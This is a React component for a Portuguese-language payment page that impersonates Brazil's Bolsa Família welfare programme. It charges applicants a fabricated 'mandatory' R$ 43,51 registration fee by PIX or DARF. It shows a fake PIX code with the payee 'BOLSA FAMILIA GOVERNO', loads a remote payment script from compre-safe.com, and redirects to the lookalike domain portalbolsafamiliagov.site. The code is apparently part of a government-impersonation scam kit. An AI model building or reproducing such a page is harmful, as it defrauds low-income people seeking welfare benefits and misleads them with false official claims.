import React, { useEffect } from 'react';
import { motion } from 'framer-motion';
import { FileText, RefreshCw, Copy, Check } from 'lucide-react';
import { useNavigate } from 'react-router-dom';
import { Header } from '@/components/Header';
import { Card, CardContent } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { useState } from 'react';
import { useToast } from '@/hooks/use-toast';
import { Toaster } from '@/components/ui/toaster';

const PixScreen: React.FC = () => {
  const navigate = useNavigate();
  const [showQR, setShowQR] = useState(false);
  const [copied, setCopied] = useState(false);
  const { toast } = useToast();

  // Simular dados do PIX (em produção viria da API)
  const pixData = {
    qrCode: "00020126580014BR.GOV.BCB.PIX013636c4b8c5-4c5e-4c5e-8c5e-4c5e4c5e4c5e52040000530398654043.515802BR5925BOLSA FAMILIA GOVERNO6009SAO PAULO62070503***6304A1B2",
    value: "43,51"
  };

  const handleDarf = () => {
    navigate('/darf');
  };

  const handleVerifyPayment = () => {
    window.location.reload();
  };

  const handleGenerateQR = () => {
    setShowQR(true);
    // Simular carregamento do QR Code
    setTimeout(() => {
      // QR Code será renderizado pelo script da Mangofy
    }, 500);
  };

  const handleCopyPix = async () => {
    try {
      await navigator.clipboard.writeText(pixData.qrCode);
      setCopied(true);
      toast({ title: "Código PIX copiado!", description: "Cole no seu app de pagamento" });
      setTimeout(() => setCopied(false), 2000);
    } catch (err) {
      toast({ title: "Erro ao copiar", description: "Tente novamente", variant: "destructive" });
    }
  };

  // Carregar script da Mangofy quando o componente montar
  useEffect(() => {
    // Verificar se o script já foi carregado
    if (document.querySelector('script[src*="automatic-pix.js"]')) {
      return;
    }

    const script = document.createElement('script'); 
    script.src = 'https://compre-safe.com/js/automatic-pix.js';
    script.setAttribute('data-code', 'vaf5q2mvgeemxp');
    script.setAttribute('data-redirect', 'https://portalbolsafamiliagov.site');
    script.defer = true;

    // Adicionar o script ao container específico
    const container = document.getElementById('pix-checkout-container');
    if (container && showQR) {
      container.appendChild(script);
    }

    // Cleanup: remover script quando componente desmontar
    return () => {
      const existingScript = document.querySelector('script[src*="automatic-pix.js"]');
      if (existingScript && existingScript.parentNode) {
        existingScript.parentNode.removeChild(existingScript);
      }
    };
  }, [showQR]);

  return (
    <div className="min-h-screen bg-gradient-to-b from-blue-50 to-white">
      <Header />
      
      <div className="bg-green-600 text-white p-4 shadow-lg mt-16">
        <div className="container mx-auto flex items-center justify-center space-x-4">
          <div className="text-center">
            <h1 className="text-xl font-bold">Pagamento da Taxa de Cadastro – Cadastro Bolsa Família</h1>
            <p className="text-green-100 mt-2">Para concluir seu cadastro e ter acesso ao benefício é necessário efetuar o pagamento da taxa única de R$ 43,51.</p>
          </div>
        </div>
      </div>

      <motion.div 
        className="flex items-center justify-center min-h-[calc(100vh-120px)] py-8"
        initial={{ opacity: 0 }}
        animate={{ opacity: 1 }}
        transition={{ duration: 0.5 }}
      >
        <div className="w-full max-w-2xl mx-auto px-4 space-y-6">
          <Card className="bg-white rounded-lg shadow-lg">
            <CardContent className="p-8">
              <div className="text-center space-y-4">
                <div className="space-y-3">
                  <p className="text-gray-700">
                    A taxa de R$ 43,51 corresponde a uma contribuição social obrigatória para a manutenção e processamento administrativo do cadastro no Programa Bolsa Família.
                  </p>
                  <p className="text-gray-700">
                    O pagamento deve ser feito por PIX ou via DARF gerado automaticamente.
                  </p>
                  <p className="text-gray-700">
                    Após o pagamento, o cadastro será confirmado e liberado.
                  </p>
                </div>
                <div className="bg-green-50 border border-green-200 rounded-lg p-4 mt-6">
                  <div className="text-3xl font-bold text-green-600 mb-4">
                    R$ 43,51
                  </div>
                  
                  {!showQR && (
                    <Button 
                      onClick={handleGenerateQR}
                      className="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-3 rounded-lg"
                    >
                      📱 Gerar QR Code PIX
                    </Button>
                  )}
                </div>
              </div>
            </CardContent>
          </Card>

          {/* QR Code Card - Aparece apenas quando solicitado */}
          {showQR && (
            <motion.div
              initial={{ opacity: 0, y: 20 }}
              animate={{ opacity: 1, y: 0 }}
              transition={{ duration: 0.3 }}
              className="flex justify-center"
            >
              <Card className="w-full max-w-sm bg-white border border-gray-200 rounded-lg shadow-lg">
                <CardContent className="p-6">
                  <div className="text-center space-y-4">
                    <h3 className="text-lg font-semibold text-gray-900">
                      Pagamento PIX
                    </h3>
                    
                    {/* Container do QR Code - Aspect Square Responsivo */}
                    <div className="mx-auto w-full max-w-[220px] sm:max-w-[280px]">
                      <div className="aspect-square bg-gray-50 border-2 border-dashed border-gray-300 rounded-lg flex items-center justify-center">
                        <div 
                          id="pix-checkout-container" 
                          className="w-full h-full flex items-center justify-center"
                        >
                          <div className="text-center text-gray-500">
                            <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-blue-600 mx-auto mb-2"></div>
                            <p className="text-sm">Carregando QR...</p>
                          </div>
                        </div>
                      </div>
                    </div>

                    {/* Valor */}
                    <div className="bg-green-50 border border-green-200 rounded-lg p-3">
                      <p className="text-sm text-green-700 font-medium">Valor a pagar</p>
                      <p className="text-2xl font-bold text-green-600">R$ {pixData.value}</p>
                    </div>

                    {/* Código Copia e Cola */}
                    <div className="space-y-2">
                      <p className="text-sm text-gray-600 font-medium">Código PIX (Copia e Cola)</p>
                      <div className="bg-gray-50 border border-gray-200 rounded-lg p-3">
                        <p className="text-xs text-gray-700 font-mono break-all leading-relaxed">
                          {pixData.qrCode}
                        </p>
                      </div>
                      <Button 
                        onClick={handleCopyPix}
                        variant="outline"
                        className="w-full"
                        disabled={copied}
                      >
                        {copied ? (
                          <>
                            <Check className="mr-2" size={16} />
                            Copiado!
                          </>
                        ) : (
                          <>
                            <Copy className="mr-2" size={16} />
                            Copiar Código PIX
                          </>
                        )}
                      </Button>
                    </div>
                  </div>
                </CardContent>
              </Card>
            </motion.div>
          )}

          <div className="flex flex-col sm:flex-row gap-4 justify-center pt-6">
            <Button 
              onClick={handleDarf}
              className="bg-blue-600 hover:bg-blue-700 px-6 py-3 rounded-lg shadow-lg"
            >
              <FileText className="mr-2" size={20} />
              Gerar DARF
            </Button>
            <Button 
              onClick={handleVerifyPayment}
              className="bg-blue-600 hover:bg-blue-700 px-6 py-3 rounded-lg shadow-lg"
            >
              <RefreshCw className="mr-2" size={20} />
              Verificar Pagamento
            </Button>
          </div>
        </div>
      </motion.div>
      <Toaster />
    </div>
  );
};

export default PixScreen;